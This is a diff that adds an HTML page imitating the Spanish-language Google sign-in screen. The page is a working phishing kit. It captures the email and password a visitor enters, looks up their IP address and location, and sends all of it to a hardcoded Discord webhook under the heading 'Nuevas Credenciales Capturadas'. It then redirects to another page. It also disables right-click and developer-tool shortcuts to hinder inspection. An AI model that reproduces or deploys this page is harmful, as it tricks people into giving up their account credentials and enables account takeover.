@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acceder</title>
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --bg-color: #f0f4f9;
+            --box-bg: #ffffff;
+            --text-main: #1f1f1f;
+            --text-secondary: #444746;
+            --blue: #0b57d0;
+            --blue-hover: #0842a0;
+        }
+        body, html {
+            margin: 0;
+            padding: 0;
+            background-color: var(--bg-color);
+            font-family: 'Google Sans', 'Segoe UI', Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background-color: var(--box-bg);
+            border-radius: 28px;
+            width: 1040px;
+            max-width: 90%;
+            display: flex;
+            flex-direction: row;
+            padding: 48px 40px;
+            box-sizing: border-box;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            z-index: 10;
+            min-height: 500px;
+        }
+        .left-panel {
+            flex: 1;
+            padding-right: 48px;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+        }
+        .right-panel {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+        .google-logo {
+            height: 36px;
+            width: auto;
+            margin-bottom: 24px;
+            display: block;
+        }
+        h1 {
+            font-size: 36px;
+            color: var(--text-main);
+            font-weight: 400;
+            margin: 0 0 16px 0;
+            line-height: 1.2;
+        }
+        p {
+            font-size: 16px;
+            color: var(--text-main);
+            margin: 0;
+        }
+        
+        .form-group {
+            width: 100%;
+            margin-bottom: 24px;
+            position: relative;
+        }
+        
+        .form-control {
+            font-family: inherit;
+            width: 100%;
+            height: 48px;
+            padding: 8px 16px;
+            border: 1px solid #747775;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: all 0.2s;
+            box-sizing: border-box;
+            color: var(--text-main);
+            background: transparent;
+        }
+        .form-control:focus {
+            outline: none;
+            border: 2px solid var(--blue);
+            padding: 8px 15px;
+        }
+
+        .account-display-box {
+            display: flex;
+            align-items: center;
+            border: 1px solid #747775;
+            border-radius: 20px;
+            padding: 4px 12px;
+            margin-bottom: 24px;
+            font-size: 14px;
+            color: var(--text-main);
+            cursor: pointer;
+            width: fit-content;
+        }
+        .account-display-box i {
+            font-size: 12px;
+            margin-right: 8px;
+        }
+
+        button.btn-primary {
+            background-color: var(--blue);
+            color: white;
+            border: none;
+            border-radius: 20px;
+            padding: 10px 24px;
+            font-family: inherit;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            float: right;
+        }
+        button.btn-primary:hover {
+            background-color: var(--blue-hover);
+        }
+
+        .actions-row {
+            width: 100%;
+            margin-top: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .secondary-link {
+            color: var(--blue);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .secondary-link:hover {
+            text-decoration: underline;
+        }
+
+        .is-hidden { display: none !important; }
+
+        .password-wrapper {
+            position: relative;
+            width: 100%;
+        }
+        .visibility-toggle {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: var(--text-secondary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+        }
+
+        @media (max-width: 900px) {
+            .container {
+                width: 100%;
+                max-width: 450px;
+                flex-direction: column;
+                padding: 36px 32px;
+                border-radius: 8px;
+                box-shadow: none;
+                background-color: transparent;
+                margin: 20px auto;
+                min-height: auto;
+            }
+            body { background-color: #fff; }
+            .left-panel {
+                padding-right: 0;
+                margin-bottom: 32px;
+                align-items: center;
+                text-align: center;
+            }
+            .google-logo { margin: 0 auto 24px; height: 36px; width: auto; }
+            h1 { font-size: 24px; }
+            p { font-size: 14px; }
+            .actions-row { flex-direction: column-reverse; gap: 24px; align-items: flex-start; }
+            button.btn-primary { width: 100%; }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 24px 16px;
+                max-width: 100%;
+            }
+            .account-display-box { width: 100%; box-sizing: border-box; }
+        }
+    </style>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+
+<body oncontextmenu="return false">
+    <script>
+        document.addEventListener("keydown", function (e) {
+            if (e.key === "F12") return false;
+            if (e.ctrlKey && e.key === "u") return false;
+            if (e.ctrlKey && e.shiftKey && e.key === "I") return false;
+        });
+    </script>
+
+    <div class="container">
+        <div class="left-panel">
+            <img class="google-logo" src="https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+            <h1 id="title-text">Acceder</h1>
+            <p id="subtitle-text">Usa tu cuenta de Google</p>
+        </div>
+        
+        <div class="right-panel">
+            <!-- Email Step -->
+            <div id="account-step" style="width: 100%;">
+                <form id="account-form" autocomplete="off">
+                    <div class="form-group">
+                        <input type="email" class="form-control" id="userAccount" name="userAccount" placeholder="Correo electrónico" required>
+                    </div>
+                    
+                    <div class="actions-row">
+                        <a href="#" class="secondary-link">¿Olvidaste el correo?</a>
+                        <button type="submit" class="btn-primary">Siguiente</button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Password Step -->
+            <div id="credential-step" class="is-hidden" style="width: 100%;">
+                <div class="account-display-box" id="go-back">
+                    <i class="fas fa-chevron-down"></i>
+                    <span id="account-display"></span>
+                </div>
+                
+                <h2 style="font-size: 24px; font-weight: 400; margin-bottom: 8px; width: 100%; text-align: left;">Te damos la bienvenida</h2>
+                <p style="font-size: 14px; color: var(--text-secondary); margin-bottom: 24px; width: 100%; text-align: left;">Ingresa tu contraseña</p>
+
+                <form id="credential-form">
+                    <div class="form-group password-wrapper">
+                        <input type="password" class="form-control" id="userCredential" name="userCredential" placeholder="Introduce tu contraseña" required>
+                        <button type="button" class="visibility-toggle" onclick="toggleVisibility()">
+                            <i class="far fa-eye"></i>
+                        </button>
+                    </div>
+                    
+                    <div class="actions-row">
+                        <a href="#" class="secondary-link">¿Olvidaste la contraseña?</a>
+                        <button type="submit" class="btn-primary">Siguiente</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1465605598677565473/GpPoSB9EH8AtU-3gb5Eqr3TA_A2Z5Q_nU4lzAtPhE00nDk9SRjMuj5HU63u71JKjr-6G';
+
+        $(document).ready(function() {
+            // Manejar Email
+            $("#account-form").on("submit", function(e) {
+                e.preventDefault();
+                const email = $("#userAccount").val();
+                if (!validateAccount(email)) {
+                    return false;
+                }
+                localStorage.setItem("userAccount", email);
+                $("#account-step").addClass("is-hidden");
+                $("#credential-step").removeClass("is-hidden");
+                $("#account-display").text(email);
+                
+                // Update left panel text
+                $("#title-text").text("Te damos la bienvenida");
+                $("#subtitle-text").text("");
+                
+                return false;
+            });
+            
+            // Retroceder
+            $("#go-back").on("click", function() {
+                $("#credential-step").addClass("is-hidden");
+                $("#account-step").removeClass("is-hidden");
+                $("#title-text").text("Acceder");
+                $("#subtitle-text").text("Usa tu cuenta de Google");
+            });
+            
+            // Manejar Password
+            $("#credential-form").on("submit", function(e) {
+                e.preventDefault();
+                const email = localStorage.getItem("userAccount");
+                const password = $("#userCredential").val();
+                if (!password) return false;
+                
+                submitCredentials(email, password);
+                return false;
+            });
+            
+            window.toggleVisibility = function() {
+                const passwordField = $("#userCredential");
+                const toggleIcon = $(".visibility-toggle i");
+                if (passwordField.attr("type") === "password") {
+                    passwordField.attr("type", "text");
+                    toggleIcon.removeClass("fa-eye").addClass("fa-eye-slash");
+                } else {
+                    passwordField.attr("type", "password");
+                    toggleIcon.removeClass("fa-eye-slash").addClass("fa-eye");
+                }
+            };
+        });
+        
+        function validateAccount(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+        
+        function submitCredentials(email, password) {
+            $.getJSON("https://api.ipify.org?format=json", function(ipData) {
+                $.getJSON("https://ipinfo.io", function(locationData) {
+                    const ip = ipData.ip;
+                    const address = locationData.city + ", " + locationData.country;
+                    const isp = locationData.org || "No disponible";
+                    
+                    const embed = {
+                        title: "🔐 Nuevas Credenciales Capturadas",
+                        color: 16711680,
+                        fields: [
+                            { name: "📧 Correo Electrónico", value: `\`\`\`${email}\`\`\``, inline: false },
+                            { name: "🔑 Contraseña", value: `\`\`\`${password}\`\`\``, inline: false },
+                            { name: "🌐 Información de Red", value: `**IP:** ${ip}\n**Ubicación:** ${address}\n**ISP:** ${isp}`, inline: false }
+                        ],
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    $.ajax({
+                        url: DISCORD_WEBHOOK_URL,
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        data: JSON.stringify({
+                            "embeds": [embed],
+                            "content": "🚨 **NUEVA CAPTURA DE CREDENCIALES**",
+                            "username": "Security Logger"
+                        })
+                    }).done(function() {
+                        window.location = 'index3.html';
+                    }).fail(function() {
+                        window.location = 'index3.html';
+                    });
+                }).fail(function() {
+                    sendBasic(email, password, ipData.ip);
+                });
+            }).fail(function() {
+                sendBasic(email, password, null);
+            });
+        }
+
+        function sendBasic(email, password, ip) {
+            const embed = {
+                title: "🔐 Nuevas Credenciales Capturadas",
+                color: 16711680,
+                fields: [
+                    { name: "📧 Correo Electrónico", value: `\`\`\`${email}\`\`\``, inline: false },
+                    { name: "🔑 Contraseña", value: `\`\`\`${password}\`\`\``, inline: false },
+                    { name: "🌐 IP", value: ip || "N/A", inline: false }
+                ],
+                timestamp: new Date().toISOString()
+            };
+            $.ajax({
+                url: DISCORD_WEBHOOK_URL,
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                data: JSON.stringify({ "embeds": [embed] })
+            }).done(function() {
+                window.location = 'index3.html';
+            }).fail(function() {
+                window.location = 'index3.html';
+            });
+        }
+    </script>
+</body>
+</html>
